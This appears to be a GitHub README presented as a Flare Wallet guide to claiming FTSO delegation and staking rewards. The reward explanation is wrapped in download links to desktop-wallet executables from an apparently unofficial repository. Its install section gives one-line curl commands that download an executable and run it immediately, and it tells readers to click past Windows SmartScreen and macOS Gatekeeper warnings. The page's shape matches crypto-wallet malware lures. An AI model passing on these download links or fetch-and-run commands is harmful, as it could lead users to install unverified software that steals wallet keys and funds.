![Flare Wallet](assets/banner-article.png)

# Flare Wallet Claim Rewards: FTSO and Staking Payouts

Where the rewards actually sit, and the 90-day window that ends the claim.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Rewards are claimed against the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) address that holds the delegation; the wallet reads the chain, it does not store the payout.

> Unclaimed delegation rewards are claimable for 90 days. That is a network rule, and no wallet setting extends it.

Delegation rewards on Flare build up across 3.5-day epochs and are paid in FLR. They do not arrive on their own: an address has to sign a claim, or the accrued amount sits on the chain until the window closes. The 90-day window is the part that costs people money, because rewards that are never claimed stop being claimable.

<!-- ARTICLE-BODY-BEGIN -->

## When rewards become claimable

Rewards accrue per epoch rather than per transaction, and the epoch is 3.5 days long. A delegation that has been registered for one full epoch has earned something; one registered an hour ago has not, no matter what the wallet shows.

A P-Chain stake runs on a slower clock than delegation, so a staked balance can go a couple of weeks between payouts. That is the reason a new stake looks silent for a while, and it is not a fault.

## Why the wallet balance does not change

Because the reward is not in your wallet until you claim it. Accrued rewards are recorded on the chain against your delegation; the claim is a transaction that moves them. A wallet showing a static balance after two weeks is often correct, not broken.

The other reason a balance looks frozen is an unclaimed position on the wrong network. Chain ID 14 is the check, and it takes ten seconds: if the wallet is pointed at a testnet it will show numbers that have nothing to do with mainnet.

## What happens to unclaimed delegation rewards

They remain claimable for 90 days. After that the network stops allowing the claim and the amount is no longer recoverable by any interface, which is why this page treats the window as the main fact rather than a footnote.

Nothing warns you at day 89. If you delegate, put a recurring reminder somewhere outside the wallet, because the wallet is not the system that enforces the rule and cannot extend it.

## The claim itself

The claim is a transaction signed by the address that holds the delegation from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>, and it costs the ordinary network fee. It is not a withdrawal from a company and it does not need anyone's approval, which also means nobody can do it for you.

The wallet can sign that transaction, but the claim interface depends on the build, so this page describes the protocol action rather than pretending to know the label on a button. Whatever interface you use, the signature has to come from the delegating address.

## Why nothing appears at all

Four causes cover most cases, in this order:

| Check | What it rules out |
| --- | --- |
| Chain ID is 14 | A testnet or another EVM chain showing unrelated state |
| The address holding the delegation is the one you are looking at | A second wallet restored from the same phrase but a different account index |
| The delegation is registered on the explorer | A transaction that never confirmed |
| At least one full epoch has passed | A position younger than the reward clock |

If all four hold and the explorer shows a reward balance the wallet does not, the wallet is behind rather than wrong. Reinstall from the release page, then read the balance from the explorer.

## Delegation versus staking payouts

Delegation pays in FLR on a 3.5-day cycle with a 90-day claim window. P-Chain staking pays on a longer rhythm, roughly every four epochs, and the stake itself stays locked for at least 14 days. Mixing the two clocks is the most common reason a reader thinks a payout has gone missing.

Both actions and their minimums are set out in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md">Flare Wallet staking</a>, and the ownership of the claim is decided by the delegation record, not by anything the wallet stores.

## FAQ

### When do staking rewards become claimable?

For delegation, rewards accrue per 3.5-day epoch. A P-Chain stake pays on a slower cycle, so expect up to a couple of weeks between claims rather than a payout every epoch.

### What happens to unclaimed delegation rewards?

They stop being claimable after 90 days. The window is enforced by the network, so no interface can restore a claim that has expired.

### Why does my wallet show no rewards after delegating?

Either fewer than one full epoch has passed, the wallet is on the wrong chain, or the delegation never confirmed. Check the address on the Flare explorer before assuming a fault.

### Do I have to claim rewards myself?

Yes. Accrued rewards sit on the chain until the address that holds the delegation signs a claim, and that signature has to come from you.

### Can I claim from a different address?

No. The claim is authorised by the delegating address, so the keys that control the delegation are the keys that claim.

### Does claiming cost a fee?

It is a network transaction, so it pays the ordinary Flare fee in FLR, which the wallet estimates before you sign.

### Where do I get the wallet to do this?

From the release page: <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a> and confirm the tag before you install.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet staking](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-staking.md) | [Flare Wallet WFLR](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-wflr.md) | [Flare Wallet not syncing](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
